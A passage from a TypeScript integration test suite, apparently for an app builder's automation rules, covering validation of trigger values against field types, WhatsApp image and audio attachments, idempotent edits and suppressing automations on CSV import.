    const email = `patch-idem-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Customer", fields: [{ name: "name", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    const record = insertRecord(db, projectId, spec.entities[0], { name: "Dana Levi" });

    const idemHeaders = { ...authHeaders(token), "x-idempotency-key": "patch-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
      method: "PATCH",
      headers: idemHeaders,
      body: JSON.stringify({ name: "Dana Cohen" }),
    });
    assert.equal(firstRes.status, 200);

    // A collaborator's own, separately-keyed edit lands before the
    // original caller's retry -- simulating the original response being
    // lost in transit while a second person's genuine update gets through.
    const collaboratorRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dana Smith" }),
    });
    assert.equal(collaboratorRes.status, 200);

    // The original caller, having never seen the first response, retries
    // with the exact same key and body.
    const retryRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
      method: "PATCH",
      headers: idemHeaders,
      body: JSON.stringify({ name: "Dana Cohen" }),
    });
    assert.equal(retryRes.status, 200);

    const getRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, { headers: authHeaders(token) });
    const { records } = (await getRes.json()) as { records: { name: string }[] };
    assert.equal(records.length, 1, "no duplicate record must exist");
    assert.equal(records[0]!.name, "Dana Smith", "the collaborator's later edit must survive the replayed retry, not be clobbered back to the retry's own stale body");
  });
});

/**
 * Round 595's Explore survey found that an automation rule's field_equals
 * trigger accepted ANY free-text fieldValue with no validation against the
 * chosen field's actual possible values. matchesTrigger (automations.ts)
 * compares with a byte-exact `String(actual) === rule.fieldValue` -- for a
 * boolean field, rowToRecord always yields a real JS boolean, so
 * String(actual) is always exactly "true" or "false"; typing "yes", "1", or
 * "כן" (all natural things to type into the plain text "Value" input in
 * AutomationsPanel.tsx) created a rule that could mathematically never
 * fire, with no error anywhere and "Last run: never" indistinguishable from
 * "hasn't happened yet." Same gap for an enum field whose typed value
 * doesn't exactly match one of its enumValues. Confirmed this is a genuinely
 * new root cause, distinct from rounds 586 (re-firing timing), 587
 * (cross-field presence invariants), and 588 (cascade-delete on removal) --
 * none of which validate fieldValue's content against the field's type.
 * Fixed by rejecting at creation/update time via a new
 * validateAutomationFieldValue() helper, mirroring repository.ts's own
 * coerceValue boolean/enum checks exactly (same error message style)
 * instead of letting a permanently-dead rule save successfully.
 */
/**
 * Round 998: creating/listing/patching/deleting an automation rule has no
 * project.status guard at all -- confirmed intentional by several other
 * pre-existing tests in this very file (e.g. the PATCH/DELETE idempotency-
 * replay tests and the checkpoint-restore migrationWarning test just
 * below) that already create and manage a rule against a project that was
 * never explicitly built, letting a user pre-configure automations ahead
 * of a project's first build. Round 997's brand-new Test route broke that
 * pattern for a record-triggered rule specifically: it called
 * `listRecords()` unconditionally, which throws a raw, uncaught
 * `SqliteError: no such table` against a project whose entity table
 * (only ever created by diffAndMigrate, from the build/refine pipeline)
 * doesn't exist yet -- surfacing as a generic 500 instead of this route's
 * own already-documented, clean 400 "no records yet" outcome, which is
 * functionally exactly what a never-built project's entity really has:
 * zero records. A "schedule" rule needs no record at all, so it's
 * untouched -- still testable on a draft project, same as creating one.
 */
test("POST .../automations/:ruleId/test on a record-triggered rule for a project that hasn't been built yet returns the same clean 'no records' error, instead of crashing with a raw SqliteError", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0]!.name;

    const ruleRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ trigger: "record_created", actionType: "send_whatsapp", toMode: "static", toNumber: "972500000000", messageTemplate: "hi" }),
    });
    assert.equal(ruleRes.status, 201, "creating a rule ahead of the first build must still work, unchanged");
    const { rule } = (await ruleRes.json()) as { rule: { id: string } };

    const testRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${rule.id}/test`, { method: "POST", headers: authHeaders(token) });
    assert.equal(testRes.status, 400, "must be the same clean 'no records yet' rejection every other entity -- not a 500");
    assert.equal(((await testRes.json()) as { code?: string }).code, "AUTOMATION_TEST_NO_RECORDS");
  });
});

test("creating or updating a field_equals automation rule with a fieldValue that can never match the field's real type is rejected with 400, instead of silently saving a permanently-dead rule", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "automation-fieldvalue-type@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description:
          "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const baseRule = {
      trigger: "field_equals",
      actionType: "send_whatsapp",
      toMode: "static",
      toNumber: "+972500000000",
      messageTemplate: "hi",
    };

    // Employee's "active" field is boolean -- "yes" can never equal the
    // real stored String(true)/"true" a record will ever actually produce.
    const badBooleanRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Employee/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldName: "active", fieldValue: "yes" }),
    });
    assert.equal(badBooleanRes.status, 400);
    assert.equal(((await badBooleanRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // The exact literal "true" is a real value a boolean record can equal,
    // so it must be accepted -- this isn't a blanket rejection of booleans.
    const goodBooleanRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Employee/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldName: "active", fieldValue: "true" }),
    });
    assert.equal(goodBooleanRes.status, 201);
    const { rule: createdRule } = (await goodBooleanRes.json()) as { rule: { id: string } };

    // Appointment's "status" field is an enum -- a typo/mismatch can never
    // equal any of its real enumValues.
    const badEnumRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Appointment/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldName: "status", fieldValue: "scheduled" }),
    });
    assert.equal(badEnumRes.status, 400);
    assert.equal(((await badEnumRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // A PATCH that would re-point an existing rule at an invalid value for
    // its (possibly new) field must be rejected the same way as creation.
    const patchRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${createdRule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ fieldValue: "yes" }),
    });
    assert.equal(patchRes.status, 400);
    assert.equal(((await patchRes.json()) as { code?: string }).code, "VALIDATION_ERROR");
  });
});

/**
 * Round 748: validateAutomationFieldValue had branches for boolean/enum/
 * date/number/relation (the same gap round 595/607/613 each closed one
 * field type at a time) but never one for "file" -- a file field's real
 * stored value (repository.ts's coerceValue default case) is the raw
 * JSON-encoded {url, name, size, mimeType} upload descriptor, which
 * matchesTrigger's byte-exact `String(actual) === rule.fieldValue`
 * comparison can never match against anything a person could type into
 * AutomationsPanel.tsx's plain-text Value box. Without this, a
 * field_equals rule on a file field saved successfully as a permanently,
 * silently dead rule.
 */
test("creating or updating a field_equals automation rule on a file field is rejected with 400, since a file field's stored value can never be typed in by hand", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `automation-file-fieldvalue-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        {
          name: "Applicant",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "resume", type: "file", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const baseRule = {
      trigger: "field_equals",
      actionType: "send_whatsapp",
      toMode: "static",
      toNumber: "+972500000000",
      messageTemplate: "hi",
    };

    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldName: "resume", fieldValue: "resume.pdf" }),
    });
    assert.equal(createRes.status, 400);
    assert.equal(((await createRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // A real, valid field type must still be accepted -- this isn't a
    // blanket rejection of the whole rule.
    const goodRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldName: "name", fieldValue: "Dana" }),
    });
    assert.equal(goodRes.status, 201);
    const { rule: createdRule } = (await goodRes.json()) as { rule: { id: string } };

    // A PATCH that would re-point an existing rule at the file field must
    // be rejected the same way as creation.
    const patchRes2 = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${createdRule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ fieldName: "resume", fieldValue: "resume.pdf" }),
    });
    assert.equal(patchRes2.status, 400);
    assert.equal(((await patchRes2.json()) as { code?: string }).code, "VALIDATION_ERROR");
  });
});

/**
 * Round 607's Explore survey found the same gap round 595 closed for
 * boolean/enum fields still open for date fields: a date field's only
 * stored shape is a real "YYYY-MM-DD" (repository.ts's own coerceValue
 * enforces this at insert time), but the live table only ever shows a date
 * field in locale-formatted form (toLocaleDateString) -- never the raw ISO
 * shape -- so a locale-formatted value like "3/15/2026" is the only thing a
 * real user has ever seen for that field and the only thing they'd type
 * into this free-text box. matchesTrigger's byte-exact comparison can never
 * match it, leaving the rule permanently, silently dead with no error.
 */
test("creating a field_equals automation rule on a date field with a locale-formatted value (what a user has actually seen on screen) is rejected with 400, instead of silently saving a rule that can never match the real stored ISO value", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "automation-date-fieldvalue@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description:
          "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const baseRule = {
      trigger: "field_equals",
      fieldName: "date",
      actionType: "send_whatsapp",
      toMode: "static",
      toNumber: "+972500000000",
      messageTemplate: "hi",
    };

    // "3/15/2026" is exactly what new Date(2026, 2, 15).toLocaleDateString("en-US")
    // renders -- the only form of this date a real user has ever seen.
    const badRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Appointment/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldValue: "3/15/2026" }),
    });
    assert.equal(badRes.status, 400);
    assert.equal(((await badRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // The real stored ISO shape must still be accepted.
    const goodRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Appointment/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldValue: "2026-03-15" }),
    });
    assert.equal(goodRes.status, 201);
  });
});

/**
 * Round 613: the identical gap round 607 closed for date fields was still
 * open for number fields. matchesTrigger (automations.ts) compares
 * String(actual), and rowToRecord (repository.ts) returns a real JS number
 * for a number field, so String(1000) is "1000". But the only form of that
 * value a real user has ever seen on screen is EntityPanel.tsx's
 * locale-formatted one (entityFormatting.ts's formatNumberValue:
 * (1000).toLocaleString() === "1,000") -- the natural thing to type into
 * this free-text box, which can never byte-match "1000" and leaves the
 * rule permanently, silently dead.
 */
test("creating a field_equals automation rule on a number field with a locale-formatted value (what a user has actually seen on screen) is rejected with 400, instead of silently saving a rule that can never match the real stored number", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "automation-number-fieldvalue@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description:
          "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const baseRule = {
      trigger: "field_equals",
      fieldName: "price",
      actionType: "send_whatsapp",
      toMode: "static",
      toNumber: "+972500000000",
      messageTemplate: "hi",
    };

    // "1,000" is exactly what (1000).toLocaleString("en-US") renders -- the
    // only form of this number a real user has ever seen for it.
    const badRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Service/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldValue: "1,000" }),
    });
    assert.equal(badRes.status, 400);
    assert.equal(((await badRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // The real stored plain-number shape must still be accepted.
    const goodRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Service/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldValue: "1000" }),
    });
    assert.equal(goodRes.status, 201);
  });
});

/**
 * Round 616: the same display-vs-stored gap rounds 595/607/613 closed for
 * boolean/enum/date/number was still open for relation fields. rowToRecord
 * (repository.ts) stores a relation field's value as the related record's
 * raw internal id, and matchesTrigger (automations.ts) compares
 * String(actual) byte-exact -- but no UI surface ever shows that raw id
 * (EntityPanel.tsx/codegen.ts always render the related record's own
 * display label via relationDisplayLabel), so the natural thing a real user
 * types into this free-text box is that label, which can never byte-match
 * the id and leaves the rule permanently, silently dead.
 */
test("creating a field_equals automation rule on a relation field with its related record's display label (what a user has actually seen on screen) is rejected with 400, instead of silently saving a rule that can never match the real stored id", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "automation-relation-fieldvalue@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A small courier delivery business." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      project.spec.entities.map((e) => e.name).sort(),
      ["Courier", "Order"],
      "this description should match exactly Order (with a courierId relation) and Courier",
    );
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const courierRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Dave", status: "Available" }),
    });
    const { record: courier } = (await courierRes.json()) as { record: { id: number } };

    const baseRule = {
      trigger: "field_equals",
      fieldName: "courierId",
      actionType: "send_whatsapp",
      toMode: "static",
      toNumber: "+972500000000",
      messageTemplate: "hi",
    };

    // "Dave" -- the courier's own display label -- is exactly what a user
    // has actually seen for this field everywhere in the UI; the raw
    // courierId the value is really stored as is never shown anywhere.
    const badRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldValue: "Dave" }),
    });
    assert.equal(badRes.status, 400);
    assert.equal(((await badRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // The real stored raw-id shape must still be accepted.
    const goodRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, fieldValue: String(courier.id) }),
    });
    assert.equal(goodRes.status, 201);
  });
});

/**
 * Round 597's Explore survey found that a toMode:"field" automation rule's
 * destination (toField) had no type restriction at all -- the create/update
 * routes only ever confirmed the field exists (findField), never that it
 * could plausibly hold a phone number. fireRule's own `typeof to !==
 * "string"` guard (automations.ts) catches number/boolean fields (both
 * become a real non-string JS value via rowToRecord), but date and enum
 * fields are stored as plain strings and sail straight through: a date
 * value like "2024-01-15" strips to "20240115" (round 506/507's own
 * missing_country_code heuristic only catches exactly one leading zero,
 * and this has none) and reaches WhatsAppWebManager.sendMessage's real
 * sock.sendMessage call with a nonsensical JID, instead of being rejected
 * at rule save time the same way round 595 already rejects a mistyped
 * trigger fieldValue.
 */
test("creating or updating a toMode:\"field\" automation rule whose destination field can never hold a phone number is rejected with 400, instead of letting a date/enum value flow into a real WhatsApp send attempt", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "automation-tofield-type@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description:
          "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const baseRule = {
      trigger: "record_created",
      actionType: "send_whatsapp",
      toMode: "field",
      messageTemplate: "hi",
    };

    // Appointment's "date" field is type:"date" -- stored as a plain
    // string, so it can never hold a real phone number.
    const badDateRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Appointment/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, toField: "date" }),
    });
    assert.equal(badDateRes.status, 400);
    assert.equal(((await badDateRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // Customer's "status" field is an enum -- same gap, different type.
    const badEnumRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, toField: "status" }),
    });
    assert.equal(badEnumRes.status, 400);
    assert.equal(((await badEnumRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // Customer's "phone" field is a genuine text field -- must be accepted,
    // this isn't a blanket rejection of toMode:"field".
    const goodRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ ...baseRule, toField: "phone" }),
    });
    assert.equal(goodRes.status, 201);
    const { rule: createdRule } = (await goodRes.json()) as { rule: { id: string } };

    // A PATCH that would re-point an existing rule's destination at a
    // non-text field must be rejected the same way as creation.
    const patchRes = await fetch(`${baseUrl}/api/projects/${project.id}/automations/${createdRule.id}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ toField: "status" }),
    });
    assert.equal(patchRes.status, 400);
    assert.equal(((await patchRes.json()) as { code?: string }).code, "VALIDATION_ERROR");
  });
});

/**
 * Round 965: performSend (whatsappWeb.ts) always attached a referenced
 * "file"-field value as a generic Baileys "document" message -- even when
 * its mimeType is a real photo. A real WhatsApp client renders a document
 * attachment as a plain download/file icon, not the inline, chat-rendered
 * photo preview a "document" (menu photo, product shot, shipping photo)
 * -based business workflow actually wants. Confirms an image mimeType now
 * sends Baileys' own `{ image: ... }` content shape, and that an ordinary
 * document mimeType (e.g. a PDF) still correctly sends `{ document: ... }`
 * -- this is a mimeType-driven branch, not a blanket behavior change.
 */
test("an automation's file attachment sends as a real inline image when the referenced file is a photo, but still as a plain document otherwise", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, db) => {
      const email = `whatsapp-image-attachment-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const user = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [
          {
            name: "Product",
            fields: [
              { name: "name", type: "text", required: true },
              { name: "photo", type: "file", required: false },
            ],
          },
        ],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: user.id, name: "Catalog", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      insertAutomationRule(db, {
        projectId,
        entityName: "Product",
        trigger: "record_created",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "972501234567",
        messageTemplate: "New product! {{photo}}",
      });

      await fetch(`${baseUrl}/api/projects/${projectId}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const imageFormData = new FormData();
      imageFormData.append("file", new File(["\xff\xd8\xff-fake-jpeg-bytes"], "product.jpg", { type: "image/jpeg" }));
      const imageUploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Product/fields/photo/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: imageFormData,
      });
      assert.equal(imageUploadRes.status, 200);
      const imageUpload = (await imageUploadRes.json()) as { file: { url: string; name: string; mimeType: string } };

      await fetch(`${baseUrl}/api/projects/${projectId}/entities/Product`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Widget", photo: JSON.stringify(imageUpload.file) }),
      });
      for (let i = 0; i < 40 && createdSockets[0].sendCalls.length < 1; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.equal(createdSockets[0].sendCalls.length, 1);
      const imageContent = createdSockets[0].sendCalls[0]!.content as { image?: Buffer; document?: Buffer; mimetype?: string; caption?: string };
      assert.ok("image" in imageContent, "a photo attachment must send as Baileys' own inline image content, not a generic document");
      assert.equal("document" in imageContent, false, "must not also send the old document shape");
      assert.equal(imageContent.mimetype, "image/jpeg");
      assert.equal(imageContent.caption, "New product! product.jpg");

      const pdfFormData = new FormData();
      pdfFormData.append("file", new File(["%PDF-fake-spec-sheet"], "spec-sheet.pdf", { type: "application/pdf" }));
      const pdfUploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Product/fields/photo/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: pdfFormData,
      });
      assert.equal(pdfUploadRes.status, 200);
      const pdfUpload = (await pdfUploadRes.json()) as { file: { url: string; name: string; mimeType: string } };

      await fetch(`${baseUrl}/api/projects/${projectId}/entities/Product`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Gadget", photo: JSON.stringify(pdfUpload.file) }),
      });
      for (let i = 0; i < 40 && createdSockets[0].sendCalls.length < 2; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.equal(createdSockets[0].sendCalls.length, 2);
      const documentContent = createdSockets[0].sendCalls[1]!.content as {
        image?: Buffer;
        document?: Buffer;
        mimetype?: string;
        fileName?: string;
        caption?: string;
      };
      assert.ok("document" in documentContent, "a non-image attachment (e.g. a PDF) must still send as a plain document");
      assert.equal("image" in documentContent, false);
      assert.equal(documentContent.mimetype, "application/pdf");
      assert.equal(documentContent.fileName, "spec-sheet.pdf");
    },
    {
      whatsapp: (db) => {
        // sendSpacingMs: 0 -- this test fires two automation sends back to
        // back; the real default (1200ms, so a real WhatsApp account never
        // gets rate-limited for spamming) would hold the second one in the
        // queue well past this test's own 40-iteration poll window.
        const created = createTestWhatsAppManager(db, { sendSpacingMs: 0 });
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 966: same degradation round 965 fixed for image/video, but Baileys'
 * own real audio content shape has no `caption` field at all (confirmed
 * directly against node_modules/@whiskeysockets/baileys's own type
 * definitions) -- unlike image/video/document, which all support one.
 * Confirms an audio attachment now sends as a real, playable Baileys
 * `{ audio: ... }` message (not a generic document), AND that the rule's
 * own messageTemplate text -- which would otherwise be silently dropped,
 * since Baileys simply never serializes an unrecognized `caption` field on
 * an audio message -- is preserved in full by sending it as its own
 * separate text message.
 *
 * Round 1242: the audio clip now sends FIRST and the caption text SECOND
 * -- the reverse of how round 966 originally shipped this. See
 * whatsappWeb.ts's performSend (its own audio branch) for the real bug
 * this reorder fixes: a real media upload is far more failure-prone than
 * a plain text send, so with text first, the common partial-failure case
 * left the caption already delivered to the real customer by the time the
 * audio send failed -- and Retry (which fires the rule again from
 * scratch, with no partial-progress tracking) then resent that same
 * caption a second time. This is the SAME scenario this test already
 * covered, just asserting the new, safer order.
 */
test("an automation's file attachment sends as a real playable audio message when the referenced file is audio, with its own caption text preserved as a separate message after the audio", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, db) => {
      const email = `whatsapp-audio-attachment-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const user = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [
          {
            name: "Order",
            fields: [
              { name: "name", type: "text", required: true },
              { name: "voiceNote", type: "file", required: false },
            ],
          },
        ],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: user.id, name: "Orders", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      insertAutomationRule(db, {
        projectId,
        entityName: "Order",
        trigger: "record_created",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "972501234567",
        messageTemplate: "Here's your order confirmation! {{voiceNote}}",
      });

      await fetch(`${baseUrl}/api/projects/${projectId}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const audioFormData = new FormData();
      audioFormData.append("file", new File(["OggS-fake-audio-bytes"], "confirmation.ogg", { type: "audio/ogg" }));
      const audioUploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/fields/voiceNote/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: audioFormData,
      });
      assert.equal(audioUploadRes.status, 200);
      const audioUpload = (await audioUploadRes.json()) as { file: { url: string; name: string; mimeType: string } };

      await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Order #1", voiceNote: JSON.stringify(audioUpload.file) }),
      });
      for (let i = 0; i < 40 && createdSockets[0].sendCalls.length < 2; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.equal(
        createdSockets[0].sendCalls.length,
        2,
        "an audio attachment must send as two physical messages -- the playable audio, then the caption text",
      );

      const audioContent = createdSockets[0].sendCalls[0]!.content as { audio?: Buffer; document?: Buffer; mimetype?: string; ptt?: boolean };
      assert.ok("audio" in audioContent, "the attachment itself must send as Baileys' own real playable audio content, not a generic document");
      assert.equal("document" in audioContent, false);
      assert.equal(audioContent.mimetype, "audio/ogg");

      const textContent = createdSockets[0].sendCalls[1]!.content as { text?: string };
      assert.equal(
        textContent.text,
        "Here's your order confirmation! confirmation.ogg",
        "the rule's own caption text must be sent in full as its own message, not silently dropped",
      );
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 643's Explore survey found that CSV import (EntityPanel.tsx's
 * handleImportFile) POSTs every parsed row through this exact route,
 * concurrently via Promise.allSettled -- before this round's fix, each one
 * unconditionally fired every "record_created" automation rule, so
 * importing a spreadsheet of pre-existing customers (the whole point of
 * this feature) sent a real WhatsApp "welcome" message to every person in
 * the file, all at once, even though none of them were actually just
 * created through the app. The fix: an X-Suppress-Automations header, set
 * only by the import path, skips the automation call entirely for that one
 * request -- an ordinary record create (no header) must still fire it.
 */
test("POST .../entities/:entityName with X-Suppress-Automations skips the record_created automation, but an ordinary create (no header) still fires it", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "suppress-automations1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          description:
            "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
        }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };
      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
      await collectSSE(buildRes);

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550009999:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const ruleRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          trigger: "record_created",
          actionType: "send_whatsapp",
          toMode: "field",
          toField: "phone",
          messageTemplate: "Welcome!",
        }),
      });
